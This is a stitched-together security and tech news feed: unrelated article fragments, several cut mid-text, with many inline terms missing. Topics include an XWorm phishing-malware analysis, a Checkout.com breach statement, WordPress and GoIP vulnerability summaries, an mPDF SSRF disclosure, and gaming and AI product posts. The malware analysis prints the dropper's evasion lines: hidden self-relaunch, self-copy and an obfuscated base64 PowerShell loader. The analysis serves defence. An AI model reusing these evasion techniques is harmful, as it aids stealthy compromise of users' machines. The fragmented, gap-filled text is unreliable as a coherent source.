While C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and  later fixing the mess, we can move faster  fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also  security.

Good instinct—it was, and what we found inside was a surprisingly old trick hiding a modern threat.If the recipient had opened the attached Visual Basic Script () file, it would have quietly installed a remote-access Trojan known as Backdoor.XWorm. Once active, it could have let attackers:Steal files, passwords and other personal dataInstall other malware, including ransomwareEverything happens silently, with no alerts or windows. It’s built to avoid antivirus tools and hand over complete control of the PC.Please find attached the list of invoices we have processed and payment has been made as of 8/1/2025 2:45:06 a.m.Kindly review and confirm that these have been received on your end.Additionally, we would appreciate it if you could send us an updated list of any outstanding or unpaid invoices for our records.Looking forward to your response.The payload was identified by our research team as . XWorm is a known remote-access trojan (RAT) and backdoor used for spying, keylogging, stealing data, and even installing ransomware. It is sold as malware-as-a-service (MaaS), which means cybercriminals sell (or more often, rent) it to other criminals, who can then distribute and deploy it as they see fit while using the MaaS provider’s infrastructure to receive stolen data and maintain access through the backdoor.Why this email was suspiciousThe email itself had obvious warning signs: no names, just a generic “Hi” and a vague “Account Officer” signature. Real invoices or payment notices almost always include contact details, so this alone should raise suspicion.That attachment immediately stood out because  files are almost never used in business emails anymore. Visual Basic Script was a Windows automation tool from the late 1990s and 2000s—long since replaced by more versatile scripting languages like PowerShell.Today, almost every company blocks  attachments outright because they can execute code the moment you open them.So when one still gets through, it usually means either a security filter failed or an attacker deliberately tried to bypass it. In 2025, receiving a  “invoice” is like finding a floppy disk in your mailbox. It’s retro, suspicious, and definitely not something you should plug in.Double-check unexpected attachments: If you weren’t expecting it, confirm first using a known contact method, rather than by replying to the same email.Don’t open executable files: Anything ending in , , , or  can run code. Legitimate businesses don’t send these by email.I wanted to know exactly what that attachment did and how it worked. For our technical readers, here’s my deep dive down the wormhole.The message itself was straightforward—a short “invoice” note with a polite request to confirm payment and a  attachment named . Nothing about the text was overtly malicious, but the presence of a Visual Basic Script attachment immediately stood out. files are rarely, if ever, used in legitimate business correspondence anymore. Because they can execute code directly, most mail gateways block them outright. Seeing one arrive intact suggested either a configuration oversight or a deliberate attempt to bypass filtering.That alone made the sample worth a closer look.Using an Excel file with a malicious VBA macro often makes more sense from a criminal’s perspective than sending a plain  attachment. Excel files are common in business environments and can appear legitimate, making them less likely to raise suspicion than a raw script. Attackers also benefit because macro-enabled Office documents remain a frequent delivery mechanism. Many users and organisations still interact with these files and can be tricked into enabling macros for what seem like “legitimate” reasons.Microsoft has made macros harder to execute by default, so some threat actors have shifted tactics. Macros still work where social engineering succeeds, but attackers increasingly experiment with other vectors when they can’t rely on macros.Compared with an Excel document, a  attachment immediately stands out as unusual in modern business email and is often blocked by gateway rules. In this case, the sender may also have been counting on hidden file extensions () to make the file look like a harmless invoice; a small deception that still fools busy users.Although  is largely obsolete, it’s not harmless. Visual Basic Script can run arbitrary commands on Windows and can download or create additional malicious files. It’s crude, but it still works if it gets past filters or lands with an unaware user.I expected the code to be less-than-sophisticated, but only the first level was.The  dropped  into  (C:\Windows\Temp\IrisBud.bat) and invoked it via WMI. The  restarted itself in a way so it ran invisibly. The batch then copied itself to the user profile as  and contained heavy obfuscation. Its end goal was to run a PowerShell loader that read encoded strings from  and turn them into the real payload.Our team identified that payload as Backdoor.XWorm—a remote-access trojan (RAT) sold as malware-as-a-service. If executed, it would give attackers stealthy access to the machine: steal files and credentials, record keystrokes, install more malware, or deploy ransomware.The whole chain runs quietly and is designed to avoid detection. Simply opening the attachment would have put the user’s data at serious risk. If you have found Backdoor.XWorm on your machine, we advise you to follow the remediation and aftermath sections of this detection profile.The  file at first sight looked like alphabet soup, but the last line (of 429) provided the plan. I commented out that last line so  would create  but  execute it.However, my hopes of the batch file being easier to read were quickly run into the ground. Most of the batch file consisted of simple  commands which wrote almost everything ad verbatim into .But if you look closely you see a lot of repeated variables like  in the first line and  in line 30. I determined that these variables were not assigned a value and only there for “padding.” Padding is a technique used by malware authors to make their malicious programs harder to detect or analyze.Imagine you have a box with secret contents that you don’t want anyone to find easily. To hide what’s really inside, you fill the box with a lot of extra, useless material—like packing peanuts, shredded paper, or just empty space—so it’s difficult for someone to see or measure what’s actually important in the box.So, my first move was to get rid of all the padding. Although not perfect, that cleared some things up.The lineif not DEFINED Abc1 (set Abc1=1 & cmd /c start "" /min "%~dpnx0" %* & exit)is a classic malware technique to hide execution from the user while keeping the script running in the background. Let’s look at it step by step: — Checks if the variable  doesn’t exist yet. — Sets the variable to  (which marks that this check has been done).cmd /c start "" /min "%~dpnx0" %* — Restarts the batch file:
 runs a new command prompt starts a program minimized (invisible to the user) is the full path to the current batch file itself passes along any command-line arguments — Exits the current (visible) instanceSo, in other words the first time it runs:It restarts itself in a minimized/hidden window.The original visible instance exits immediately.The new hidden instance continues running with  set, so it won’t trigger this restart loop again.And this line:copy "%sourceFile%" "%userprofile%\aoc.bat" >nulis where the bat file copies itself to the user’s profile directory. — The source (set earlier to the current batch file’s full path). — The destination: the user’s profile directory (typically ) with the new name . — Suppresses output (hides the “1 file(s) copied” message).The setlocal enabledelayedexpansion is needed because exclamation marks () around variables are used for delayed variable expansion, which allows the batch script to update and use the value of variables dynamically within loops or code blocks where normal percent expansion wouldn’t work. This requires delayed expansion to be enabled which is done with the command setlocal enabledelayedexpansion.From the next lines I can tell that the  which we see can be replaced by the  command.Because it is defined by:set "xmgotoyfycqitjc=!ejlhixzkmttzgho!e!ugcqubmykdxgowp!"where earlier we saw:set "ejlhixzkmttzgho=s"set "ugcqubmykdxgowp=t"Together this makes xmgotoyfycqitjc = s + e + t so my next step was to replace all those instances. And with that we made a good start at mapping out all the variables that were not intended as padding.Of specific interest in this case was one particular line (414) where all the mapped variables came together.The only two other lines that stood out were two lines that begin with  and contain a very long string. While these superficially appear to be ordinary batch comments, they actually hide encrypted payload data (lines 41 and 69 are the hidden payload).We’ll get to those later on.First, we need to construct line 414 into something readable.After replacing all the defined variables, line 414 turned into this:Windows\System32\WindowsPowerShell\v1.0\powershell.exe-nop -c coding]::Unicode.GetString([Convert]::FromBase64String(('CgAkA…..{very_long_base64_encoded_string}…..AoA'.Replace('hkfdo','')))))The  command showed me that I had to remove even more padding—this time from the encoded PowerShell script which was padded with the  string.After I did that and decoded the base64 string, this was the PowerShell script:What this PowerShell script does explains why the two long lines I referred to earlier are needed:: the script looks for the hidden payload in  (the copy it created). The script reads  line by line, looking for lines that start with  (three colons). If it finds one, it treats everything after the colons as Base64-encoded data, decodes it, and runs it as PowerShell code. This is a way to hide malicious commands inside what looks like a batch file comment. creates the main malicious payload The big block (starting with ) does several things:Reads encrypted data from : It looks for a line starting with  (two colons) in the batch file, which contains encrypted and compressed malware. It uses AES encryption (with a hardcoded key and Initialization Vector (IV)) to decrypt the payload. Think of this like unlocking a safe with a specific combination. After decryption, it unzips the data using GZip compression. The malware was squeezed down to make it smaller and harder to detect.Loads and runs the malware: The decrypted/decompressed data turns out to be two executable files. The script loads these files directly into memory and runs them without ever saving them to disk. This is called a “fileless attack” and helps avoid anti-malware detection.By loading and running these malicious programs directly in memory, the attack avoids dropping visible files on disk, making it much harder for anti-malware solutions to spot or capture the real threat.To extract the payload safely I wrote a Python script to reproduce steps 1–3 without executing the code in memory. That produced two executable samples which I ran in an isolated sandbox.The sandbox revealed a mutex  which pointed to the XWorm family. “Mutex” stands for mutual exclusion, which is a special marker that a running program creates on a Windows computer to make sure only one copy of the process is running at once. Malware authors bake them into their code and security analysts catalog them, much like a “fingerprint.” So when our researchers see one of the known mutex names, they can easily classify the malware and move on to the next sample.

No merchant funds or card numbers were accessed. We are donating the ransom amount to fund cybercrime research.Last week, Checkout.com was contacted by a criminal group known as “ShinyHunters”, who claimed to have obtained data connected to Checkout.com and demanded a ransom.Upon investigation, we determined that this data was obtained by gaining unauthorized access to a legacy third-party cloud file storage system, used in 2020 and prior years. We estimate that this would affect less than 25% of our current merchant base. The system was used for internal operational documents and merchant onboarding materials at that time.This incident has not impacted our payment processing platform. The threat actors do not have, and never had, access to merchant funds or card numbers.The episode occurred when threat actors gained access to this third party legacy system which was not decommissioned properly. This was our mistake, and we take full responsibility.We are sorry. We regret that this incident has caused worry for our partners and people. We have begun the process to identify and contact those impacted and are working closely with law enforcement and the relevant regulators. We are fully committed to maintaining your trust.  We will not be extorted by criminals. We will not pay this ransom. Instead, we are turning this attack into an investment in security for our entire industry. We will be donating the ransom amount to Carnegie Mellon University and the University of Oxford Cyber Security Center to support their research in the fight against cybercrime.Security, transparency and trust are the foundation of our industry.

The Import any XML, CSV or Excel File to WordPress (WP All Import) plugin for WordPress is vulnerable to Remote Code Execution in all versions up to, and including, 3.9.6. This is due to the use of eval() on unsanitized user-supplied input in the pmxi_if function within helpers/functions.php. This makes it possible for authenticated attackers, with import capabilities (typically administrators), to inject and execute arbitrary PHP code on the server via crafted import templates. This can lead to remote code execution.

 Nov. 13, 2025, 4:15 a.m. | 1 day, 12 hours ago
The LifterLMS – WP LMS for eLearning, Online Courses, & Quizzes plugin for WordPress is vulnerable to privilege escalation. This is due to the plugin not properly validating a user's identity prior to allowing them to modify their own role via the REST API. The permission check in the update_item_permissions_check() function returns true when a user updates their own account without verifying the role changes. This makes it possible for authenticated attackers, with student-level access and above, to escalate their privileges to administrator by updating their own roles array via a crafted REST API request. Another endpoint intended for instructors also provides an attack vector. Affected version ranges are 3.5.3-3.41.2, 4.0.0-4.21.3, 5.0.0-5.10.0, 6.0.0-6.11.0, 7.0.0-7.8.7, 8.0.0-8.0.7, 9.0.0-9.0.7, 9.1.0.

This means WhatsApp on Windows 11 is cooked, and it’s back to being absolute garbage in terms of performance.WhatsApp is one of those Windows apps that went from being a web wrapper to a native app and then back to the web again after all these years of investment.WhatsApp for Windows was originally an Electron app, and it was eventually replaced with UWP after years of investment. Four years later, WhatsApp is going back to WebView2, abandoning the original WinUI/UWP native idea.My understanding is that the recent layoffs at Mark Zuckerberg-headed Meta likely disbanded the entire team behind the native WhatsApp. I don’t see any other reason why Meta would abandon its native app for Windows. Meta will save costs by maintaining the web app codebase on Windows, but you’re going to hate the experience.How bad is the new WhatsApp for Windows 11?Our tests showed that new Chromium/WebView2-based WhatsApp for Windows 11 uses up to 300MB of RAM when you are on the login screen and doing nothing. On the other hand, the old/native WhatsApp uses just 18MB of RAM and even slips to less than 10MB when left idle on the login screen.After logging in, WhatsApp (new) memory usage increased to 2GB while trying to load all my chats. On average, it used 1.2GB when left idle in the background.You’d realise how bad this is when I tell you the benchmarks for the native WhatsApp for comparison. I tested the old/native WhatsApp, and it uses just 190MB most of the time, dropping to less than 100MB when it’s completely idle. At worst, it would reach 300MB, which can happen only when the chat is really active.By the looks of things, this new WhatsApp for Windows 11 can touch 3GB RAM if you have too many active conversations.It’s absolutely garbage, and it should not be allowed inside the Microsoft Store. You’re better off using WhatsApp on the web (Edge/Chrome) than updating/downloading this new WebView2-based app.In fact, it appears that WhatsApp web (web.whatsapp.com) in any browser is less terrible than this WebView2 container.New WhatsApp is a performance nightmareAn app can use a lot of memory, and it does not necessarily mean it’s a performance nightmare, but the issue with the new WhatsApp is that it feels sluggish. You’re going to notice sluggish performance, long loading time, and other performance issues when browsing different conversations.We also noticed that it does not work well with Windows notifications. It also struggles with Windows 11’s Do Not Disturb mode or Active Hours. And there are delayed notifications problems as well.Can you avoid this new WhatsApp upgrade on Windows 11? Yes, but not for a very long timeWindows Latest found that WhatsApp version 2.2584.3.0 replaces the native (WinUI/UWP) app and is rolling out in all regions via the Microsoft Store. Do not download it, and you might still be allowed to use the native app for the next days.However, Windows Latest has learned that all users will be logged out eventually and forced to use the WebView2-based WhatsApp.This ‘upgrade’ ships as the WhatsApp native experience rolls out on Apple Watch, which has 115 million consumers, while Windows has over one billion active monthly devices. Clearly, numbers are not always enough, and I am not sure if I can really blame Meta when Microsoft also does not make native apps for Windows anymore.]]></content:encoded></item><item><title>Lite XL Text editor Vulnerability Let Attackers Execute Arbitrary Code</title><link>https://cybersecuritynews.com/lite-xl-text-editor-vulnerability/</link><author></author><category>security</category><pubDate>Thu, 13 Nov 2025 03:13:24 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

In 2024, 30% of breaches involved a third-party vendor, twice as much as the previous year.Static assessments are no longer enough. Questionnaire-based audits provide only outdated snapshots, leaving organizations blind to evolving threats between review cycles.Continuous, intelligence-led monitoring is essential. Real-time visibility into vendors’ external security posture enables faster detection, objective risk scoring, and proactive defense.Recorded Future’s Third-Party Intelligence closes the gap. By continuously tracking over 5 million organizations and 1 million technology products, it gives security teams the data-driven insight needed to stay ahead of emerging supply chain threats.The Modern Supply Chain: A Widening Attack SurfaceThe digital supply chain has undergone a profound transformation. What was once a small network of trusted vendors has evolved into a vast, interconnected web of technologies, platforms, and data flows.Cloud providers now host mission-critical infrastructure. SaaS platforms handle sensitive data. Managed service providers, subcontractors, and open-source libraries form the unseen backbone of daily operations. Each of these relationships expands the attack surface, introducing new dependencies and new vulnerabilities.A single vendor today may rely on dozens of others, each with its own third- and fourth-party relationships. The result is an ecosystem of thousands of potential ingress points, with many of them outside an organization’s direct line of sight. These dependencies are often invisible beyond the first tier, leaving businesses exposed to risks they may not even know exist.Cybercriminals understand this. Supply chain compromises have become a preferred strategy for attackers because infiltrating a vendor is often easier and more scalable than targeting an organization directly. By compromising one trusted connection, adversaries can pivot to dozens of downstream victims, often before the original breach is even detected.This expanding ecosystem demands a new approach. Securing the modern digital supply chain requires continuous, intelligence-led visibility, one that provides an external, real-time view of every partner and vendor’s security posture. Only with ongoing, data-driven insight can organizations uncover hidden exposures and detect emerging threats before small weaknesses become systemic failures.The Unavoidable Truth: Key Third-Party Risk Statistics for 2025Every year, the volume, cost, and complexity of vendor-related breaches continue to rise, exposing weaknesses that traditional risk management can’t contain. The following third-party risk statistics illustrate just how pervasive the problem has become and why a new approach is urgently needed.Third-party breaches are no longer isolated events. They are becoming a defining feature of the modern threat landscape.According to Verizon’s most recent Data Breach Investigations Report, 30% of breaches involved a third-party vendor, twice as much as the previous year. However, this figure is likely conservative due to underreporting and misclassification, especially when the compromise occurs several layers deep in their vendor ecosystem.According to IBM’s 2024 Cost of a Data Breach report, the average cost of a third-party breach is over $5.08 million. Highly regulated sectors such as healthcare and finance face even steeper costs.The true financial impact of a breach extends beyond the initial response, encompassing lost revenue, increased cyber insurance premiums, and reputational damage that drives customer churn. Organizations may also face expensive marketing and PR efforts to restore trust after a high-profile supply chain incident.Dwell time — the duration between initial compromise and detection — compounds these costs. In 2024, organizations with a dwell time beyond 200 days faced average breach costs of $5.01 million.Gartner research reveals that third-party breaches cost roughly 40% more to remediate than those that originate within an organization’s own systems, due to the additional complexity of managing incidents that span multiple entities, legal jurisdictions, and data environments. When breaches involve personally identifiable information (PII), PHI, or payment card data, costs can climb even higher as regulatory penalties and legal exposure multiply.Hidden Dangers: Fourth-Party and Nth-Party RiskModern supply chains extend far beyond the vendors an organization directly manages. Each third-party relationship is underpinned by its own network of fourth and nth parties—subcontractors, technology providers, and cloud services. These indirect dependencies create exposure that most organizations can neither see nor control.According to Whistic’s 2024 Third-Party Risk Management Impact Report, half of all companies work with more than 100 vendors, up from 38% in 2023. And for each third-party vendor in a supply chain, organizations typically have indirect relationships with nearly 14 times more fourth and fifth parties, according to The Cyentia Institute.These numbers underscore the growth of interconnected risk. Each new supplier introduces dozens of unseen connections, and every one of those connections can become an attacker’s entry point. The impact can quickly cascade through shared platforms, APIs, and service providers, affecting multiple tiers of partners and customers.The MOVEit breach of 2023 is a prime example. What began as a single vulnerability in one file transfer application rapidly spread across thousands of organizations, from banks and universities to government agencies. Many of those affected never had a direct contract with the compromised vendor.Why Traditional Third-Party Risk Assessments Are FailingFor many organizations, third-party risk management still relies on the same tools and tactics used a decade ago—static checklists, self-reported questionnaires, and periodic audits. These methods were designed for a slower, more predictable vendor landscape. Today, they’re simply outmatched by the size and interconnectivity of modern supply chains.Vendor questionnaires and checklists are only as good as the answers provided. Too often, the information is outdated, incomplete, or inaccurate, leaving security teams with a false sense of assurance. These assessments might capture what a vendor’s security looked like at a single moment in time, but attackers don’t wait for your next scheduled check-in. Every day between audits is another opportunity for adversaries to exploit newly discovered vulnerabilities or misconfigurations.Static assessment programs also lack the scale and speed required to monitor hundreds or thousands of vendors effectively. As the vendor ecosystem expands, traditional approaches simply can’t keep pace with the dynamic nature of today’s threat environment.The data underscores just how strained these legacy methods have become:44% of organizations assess more than 100 third parties each year, yet only 4% of organizations have high confidence that their third-party questionnaires accurately reflect real-world risk.Nearly four in ten companies use multiple questionnaires for different risk domains, sending an average of 55 questionnaires to third parties annually.These numbers reveal a troubling paradox: organizations are spending more time than ever assessing vendors but gaining less clarity than ever in return. Without continuous, intelligence-led visibility, even the most diligent third-party risk programs are operating one step behind and measuring compliance rather than managing risk.Shifting from Assessment to Intelligence: A Better ApproachTraditional third-party risk assessments expose the limits of hindsight. Intelligence-led monitoring delivers the advantage of foresight.Static questionnaires stop at the vendor’s last self-reported status, which quickly becomes obsolete when adversaries move by the hour. An intelligence-based approach, by contrast, looks outward to live signals, behavioral patterns, and threat activity that reflect a vendor’s true security posture in real time.The core shift is from  to . capture what vendors say about their defenses. reveals what attackers see (and often what vendors don’t yet know).This change is more than a process upgrade; it’s an evolution in how organizations manage supply chain security. Continuous, intelligence-led monitoring replaces static snapshots with ongoing, data-driven visibility across every tier of the vendor ecosystem.By ingesting indicators from the open web, dark web, and technical telemetry, organizations can identify vulnerabilities or emerging exploit chatter as they happen—not months after the fact. The advantages are clear: Intelligence shifts third-party risk from response to prevention, allowing teams to identify issues before they evolve into breaches.Objective vs. Subjective: Real-world data replaces self-attestation, grounding risk decisions in observable evidence rather than vendor claims.Comprehensive Visibility:Continuous monitoring provides an attacker’s-eye view of each vendor’s digital footprint, uncovering blind spots that traditional audits miss.How Recorded Future’s Third-Party Intelligence Delivers Continuous, Contextual InsightRecorded Future’s Third-Party Intelligence exemplifies this modern approach. It delivers real-time risk scores and actionable alerts derived from the broadest range of data sources available, including dark web monitoring, technical telemetry, and validated threat intelligence. These insights integrate into existing risk management workflows, transforming static oversight into a living, adaptive defense.Core capabilities include: Tracks over 5 million organizations and 1 million technology products for breaches, malicious traffic, ransomware extortion, and dark web chatter. Uses machine learning and NLP to analyze data from hundreds of thousands of open, dark web, and technical sources, generating dynamic Risk Scores that quantify vendor exposure.Dark Web and Threat Intelligence. Identifies data leaks, compromised credentials, and chatter around vendor breaches before disclosure.Comparative Vendor Assessment. Enables side-by-side comparison of vendors to prioritize procurement and onboarding decisions. Delivers comprehensive, context-rich risk profiles for leadership and board reporting. Connects with existing TPRM, GRC, and ticketing platforms, feeding risk data into established workflows.Automated Mapping of Internal Entities and Subsidiaries. Assesses risk stemming from a supplier’s technical infrastructure, subsidiary relationships, and geographic footprint. Allows teams to define criteria for alerts (e.g., vendor breach, new exposure) and focus only on the most relevant risks.Customer outcomes include:73% average increase in visibility into potential threats32% less time spent on evaluating new vendors or supplier35% more third parties assessed43% average increase in security team capacityOur time to detect third-party cyber breaches has decreased substantially. Previously, we were either notified directly by a third party or via a news outlet or regulatory reporting, which meant that it could take days or even weeks for us to be made aware. With Recorded Future, we've been able to identify third-party concerns within one to two days.Cybersecurity Incident Management, Insurance CompanyThe evidence is clear: reactive oversight leaves organizations blind to threats already moving through their supply chains. A continuous, intelligence-driven approach changes that equation. By combining real-time visibility with actionable insights, security and risk teams can detect vendor threats early, respond faster, and reduce the financial and reputational fallout of supply chain attacks.Don’t wait for the next third-party breach to become another statistic. Book a demo to see how Recorded Future’s Third-Party Intelligence helps organizations stay ahead of rapidly evolving risks.What is considered a third-party risk?A third-party risk is any potential threat to your organization's security, finances, or reputation posed by an external vendor, supplier, partner, or contractor who has access to your data, systems, or networks. This includes risks like data breaches, operational disruptions, and compliance violations originating from your supply chain.What are the main types of third-party risk?The main types include cybersecurity risk (data breaches, malware), operational risk (service disruptions), compliance risk (violating regulations like GDPR or CCPA), reputational risk (damage to your brand by association), and financial risk (revenue loss, regulatory fines).How often should third-party risk assessments be conducted?While traditional best practice was to conduct assessments annually, the current threat landscape demands a shift to continuous monitoring. Relying on annual, point-in-time assessments leaves significant security gaps where a vendor's risk posture can change without you knowing.How does Recorded Future help with third-party risk assessment?Recorded Future’s Third-Party Intelligence solution transforms risk assessment from a static, manual process into a dynamic, data-driven one. It provides continuous, real-time intelligence on your vendors' external security posture by monitoring millions of sources, including the dark web. This allows you to proactively identify threats, prioritize risks with objective scoring, and take action before a vulnerability impacts your organization.What is the first step to improving a third-party risk management program?The first step is to gain complete visibility into your entire vendor ecosystem. You cannot protect what you don't know you have. This involves identifying every third party and fourth party with access to your data or systems and then beginning the process of prioritizing them based on their level of access and criticality to your operations.]]></content:encoded></item><item><title>Voyager 1 is a light-day away by November 2026</title><link>https://www.iflscience.com/on-november-13-2026-voyager-will-reach-one-full-light-day-away-from-earth-81432</link><author>Neuronaut</author><category>dev</category><pubDate>Wed, 12 Nov 2025 23:38:56 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[© 2025 IFLScience.

            Valve does nothing and still winsToday was a big day for gamers as Valve just introduced three products: the Steam Controller, the Steam Machine, and the Steam Frame. When you add this alongside the Steam Deck, I think it's safe to say that Valve is about to win the next console generation.I have basically nothing to say about the Steam Controller. It's the Steam Deck's input but in a controller. There's no way they can really mess it up in a way that isn't recoverable.What else is there to say?The Steam Machine of yore was one of the biggest tech flops in history and led to a lot of the changes that has made Valve hardware so good. Based on what they've announced, the software ecosystem I know and love on SteamOS, and response from developers I talk with, there's a reasonable chance that this new Steam Machine is going to be the most compelling console on the market.TL;DR: The Steam Machine's specs are on par or better with the PS5. It's got 16 GB of ram, a dedicated GPU with 8GB of video ram, and it's about the size of three M1 Mac Minis stacked on top of each other with a slightly bigger footprint than a Nintendo GameCube.I see no real way that this could be a failure in the same way that the last Steam Machine was. If they don't fuck this up, I could pretty confidently say that Valve is going to win this console generation.In retrospect, I think that the failure of the first Steam Machine was
probably one of the best things to ever happen to Valve. Proton, Steam Play,
and the Steam Deck are the proof that Valve learned all the lessons they
needed to in order to make a next generation Steam Machine a viable console.The biggest difference between SteamOS and other console operating systems is that SteamOS is just an immutable image-based fork of Arch Linux with a skin on top. If you can do it with a normal PC, you can do it on SteamOS.Wait, you said that you can do  you can do on a normal PC, but you
also said it's running an immutable OS. What if my definition of "anything"
includes "install system packages"?Good point, I'm not worried about that for two main reasons: developers have
already found ways to use things like distrobox to
give you islands of mutablity in an otherwise immutable system on the Steam
Deck, and you can just blow away the OS and install whatever you want (such
as Bazzite) or any normal Linux distribution. You
could even put Windows on it if you needed to for some reason.This means that even though Valve will be selling this hardware at a loss, you can still buy one and never purchase anything else from them. You can install any compatible game from any marketplace. In their own words:Yes, Steam Machine is optimized for gaming, but it's still your PC. Install your own apps, or even another operating system. Who are we to tell you how to use your computer?I cannot even imagine the other console manufacturers saying this.I'd easily imagine that it'd have free reign across a majority of the Steam library. By sheer game count alone, this would make it one of the biggest console launch libraries on the market. This isn't even counting the fact that you can install alternative marketplaces like itch.io, GOG, or anything Lutris supports (EG: Epic Games).Valve does nothing and still wins.One of the bigger things that I don't think people really appreciate about the Steam Machine (or even the Steam Deck for that matter) is that the freedom to install whatever program, framework, background service, or OS you want means that every Steam Machine can be used to make games. Some of their promotional images show a Steam Machine in a dual-monitor setup split between Blender and Godot.I don't think you realize how big of a deal this is. By making every Steam Machine also powerful enough to do full on game development, Valve is making it so much easier to become an independent game developer. Just add ideas, skill, and time.Hilariously, this means that the Steam Machine is probably the only console on
the market that's fully compliant with the EU's Digital Markets Act. It would
be absolutely hilarious if the EU ends up using this as rationale for
Nintendo, Microsoft, and Sony to open up their consoles for third party
developers.Oh and to top it off, the internal storage is upgradable and can take full-size nvme drives. If you pop your microSD card out of your Steam Deck, you can put it into your Steam Machine and get all your games instantly. Reportedly the ram is user-upgradable too.The only way that they could mess this up is with the pricing. The price will be what determines if this is a PS5 killer or a mid-range home theater PC that can do games decently well. Given the fact that Steam prints so much money, I'd expect the pricing to be super aggressive.Worst case, this would be a great home theatre PC. I'd rock it in my media
centre. It's going to run Plex, Twitch, and Youtube just fine.Valve also announced their successor to the Valve Index today, the Steam Frame, a standalone VR headset. It's basically a Meta Quest headset, but also a Steam Deck. They market it as being able to play VR and 2D games effortlessly. The weirdest thing about it is that it's running a 64 bit ARM CPU instead of a conventional AMD APU like the Steam Deck and Steam Machine. This means that SteamOS is going to be cross-architecture for the first time and they're going to use FEX to bridge the gap.The big thing I want to see in practice is their implementation of foveated rendering. This beautiful hack abuses the fact that human eyes have the most sharpness and fidelity at the exact centre of your field of vision, whereas your peripheral vision is abysmal at it. This means that on average you only have to render about 10% of the frame at maximum quality for it to  like it's running at full resolution all over the screen.This should make the fact that the Frame is using a "weaker" CPU/GPU irrelevant. Games should look fine as long as they render the slice that needs to be in full quality fast enough.Even more fun, they take advantage of the same tricks behind foveated rendering for streaming games from a PC or Steam Machine. This means that you get that same optically perfect quality but with even less latency because less data has to be transferred to hit your eyes.I really want to see what this is like in practice. Reportedly there's no
perceptual difference between this setup and rendering games at 100% full
quality.The Steam Frame ships with a USB dongle that lets you use the might of your gaming tower for low latency VR gaming. I'll need to see this in practice in order to have opinions. I think that in the worst case it can't possibly be any worse than it was streaming VR games to my Quest 2 over Wi-Fi. That was tolerable and viable for mid-level Beat Saber. I have confidence that it will at least be sufficient for high level Beat Saber gameplay.Remember how I said that it's a Steam Deck in a headset? The Steam Frame runs full SteamOS. You can just boot it into a full KDE desktop and use it as a normal computer. I have no reason to doubt that every Steam Frame is also a development kit in the same way that the Steam Machine is also a development kit.They also claim you can load arbitrary Android apps into the Steam Frame. I need to see this in action before I have opinions about it. It would be exceptionally funny if this meant you could take apps/games made for the Meta Quest and just plop them onto the Steam Frame without modification. I'm not holding my breath, but it would be funny.The only possible flaw I can see is that the strap it ships with doesn't go over the top of your head. If this ends up being an issue in practice, somebody is going to make a third party strap that just fixes this problem. I'm not concerned.Really, the only thing that can go wrong with any of this hardware is the price. I would still be happy if the pricing was the worst part of this lineup. It would be really cool if there was a bundle.I'm at least planning on getting a Steam Machine on day 1 and making a review. What would you like to see in that? Let me know on Bluesky.Facts and circumstances may have changed since publication. Please contact me before jumping to conclusions if something seems wrong or unclear.]]></content:encoded></item><item><title>Breaking mPDF with regex and logic</title><link>https://medium.com/@brun0ne/breaking-mpdf-with-regex-and-logic-bf915300483f</link><author>/u/ZoltyLis</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 23:24:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[So, what did I do about it?Of course right away I thought the developer of mPDF should be made aware of this behavior.I reported it on  and got acknowledgement from the main maintainer on (6 months ago as of writing this article).This behavior has not been changed/fixed as of writing this article.On  I requested a CVE via the MITRE CVE form.On  the request was rejected with the following response:These are not valid vulnerability reports, and no CVE IDs will be assigned.Please refer to the documentation:“Warning: All user input passed to mPDF should be sanitized properly.”A finding of SSRF is not relevant, because mpdf intentionally makes outbound network requests that depend on the content of theA project’s choice to release a PDF producer for sanitized and trustedHTML input does not mean that they are required to implement asanitizer as part of their project.

The device's web server exposes handlers (`frame.html` and `frame.A100.html`) that accept a path parameter (`content` or `sidebar`) which is not properly validated or canonicalized. An attacker can supply directory-traversal sequences to cause the server to read and return arbitrary filesystem files that the webserver user can access. Other GoIP models and firmware versions are likely affected. Exploitation evidence was observed by the Shadowserver Foundation on 2024-03-21 UTC.

demanding powerful world models to realize its full potential.
World models should reconstruct, generate, and simulate 3D worlds;
and allow both humans and agents to interact with them.
Spatially intelligent world models will
transform a wide variety of industries over the coming years.Two months ago we shared a preview of Marble,
our World Model that creates 3D worlds from image or text prompts.
Since then, Marble has been available to an early set of beta users
to create 3D worlds for themselves.Today we are making Marble,
a first-in-class generative multimodal world model,
generally available for anyone to use.
We have also drastically expanded Marble's capabilities,
and are excited to highlight them here::
Marble is now massively multimodal.
Marble can create 3D worlds from text, images, video, or coarse 3D layouts;
Marble also lets you interactively edit, expand, and combine worlds.
Once generated, 3D worlds can be exported as Gaussian splats, meshes, or videos.
These new capabilities let users create and edit worlds with fine-grained control;
and makes those worlds more useful than ever before.:
We are launching Marble Labs,
a creative hub where imagination meets experimentation.
It is where artists, engineers, and designers push the boundaries of world models,
showcasing bold ideas, real-world workflows,
and new possibilities across gaming, VFX, design, robotics, and beyond.
Marble Labs is also home to in-depth case studies, tutorials, and documentation
that give anyone the tools to learn, build, and share their own 3D worlds.Sign up at marble.worldlabs.ai and start creating worlds for yourself!Our human experience of the world is inherently multimodal:
we use all of our senses to make sense of the world around us.
We integrate sight, sound, touch, and language to build up a mental model of the outside world;
these different representations work together, enriching and reinforcing each other to
let us reason about the world and act within it.World models should work similarly.
They should be massively multimodal, able to lift whatever input signals are available
into a full 3D world, and they should be able to iteratively update their understanding
of the world as new information becomes available.Marble is the first of its kind - a next-generation world model making strides toward this vision.
It can now create 3D worlds from a wide variety of input types,
and lets users iteratively edit or expand worlds.Marble's new capabilities let you dive as deep as you want in controlling your generated worlds.
You can quickly create full 3D worlds from a simple image or text prompt
or interactively edit worlds in both 2D and 3D,
bringing to life a precise vision of a world in your mind.To start, Marble can create a full 3D world from a single image or a short text prompt.
This is the simplest and easiest way to create worlds.
Marble can generate worlds with a wide variety of scene types and artistic styles.Image prompts make it easy to combine Marble with other AI tools.
You can generate images with your favorite image generation model,
then bring it to Marble to lift it to a full 3D world.Text and image prompts are intuitive and powerful,
but limited in creative control:
